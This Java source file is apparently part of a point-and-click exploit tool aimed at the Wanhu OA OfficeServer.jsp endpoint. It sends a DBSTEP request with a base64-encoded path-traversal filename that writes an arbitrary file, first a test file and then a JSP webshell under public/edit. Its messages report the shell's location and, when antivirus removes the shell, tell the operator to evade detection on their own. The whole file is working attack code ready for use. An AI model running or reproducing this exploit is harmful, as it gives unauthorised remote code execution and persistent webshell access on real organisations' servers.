package exp.oa.wanhuoa;

import core.Exploitlnterface;
import java.util.HashMap;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class wanhuoa_OfficeServer implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url, TextArea textArea) {
        Response response = HttpTools.get(url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp", new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200) {
            String post = "DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ\r\n" +
                    "OPTION=U0FWRUZJTEU=\r\n" +
                    "RECORDID=\r\n" +
                    "isDoc=dHJ1ZQ==\r\n" +
                    "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                    "FILETYPE=Li4vLi4vcHVibGljL2VkaXQvbmlzaGl6aHUudHh0\r\n" +
                    "111111111111111111222222222222222222222\r\n" +
                    shell.readFile(shell.Testpath);

            HttpTools.post(url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp", post, new HashMap<String, String>(), "utf-8");

            Response response1 = HttpTools.get(url + "/defaultroot/public/edit/nishizhu.txt", new HashMap<String, String>(), "utf-8");
            if (response1.getCode() == 200 && response1.getText().contains(shell.test_payload)) {
               Platform.runLater(()->{
                  textArea.appendText("\n");
                  textArea.appendText("漏洞存在 测试文件已写入 \n " + url + "/defaultroot/public/edit/nishizhu.txt");
               });
                return true;
            } else {
               Platform.runLater(()->{
                  textArea.appendText("\n");
                  textArea.appendText("wanhuoa_OfficeServer-RCE-漏洞不存在 (出现误报请联系作者)");
               });
                return false;
            }
        } else {
            Platform.runLater(()->{
              textArea.appendText("\n");
              textArea.appendText("wanhuoa_OfficeServer-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        String post = "DBSTEP V3.0     170              0                5000              DBSTEP=REJTVEVQ\r\n" +
                "OPTION=U0FWRUZJTEU=\r\n" +
                "RECORDID=\r\n" +
                "isDoc=dHJ1ZQ==\r\n" +
                "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                "FILETYPE=Li4vLi4vcHVibGljL2VkaXQvbmlzaGl6aHUuanNw\r\n" +
                "111111111111111111111111111111111111111111111111\r\n" +
                shell.readFile(shell.Jsppath);

        HttpTools.post(url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp", post, new HashMap<String, String>(), "utf-8");

        Response response1 = HttpTools.get(url + "/defaultroot/public/edit/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
        if (response1.getCode() == 200 && response1.getText().contains(shell.test_payload)) {
           Platform.runLater(()->{
              textArea.appendText("\n 漏洞存在 webshell已写入 \n " + url + "/defaultroot/public/edit/nishizhu.jsp");
           });
            return true;
        } else {
            Platform.runLater(()->{
              textArea.appendText("\n webshell被查杀，请自行免杀");
            });
            return false;
        }
    }

}
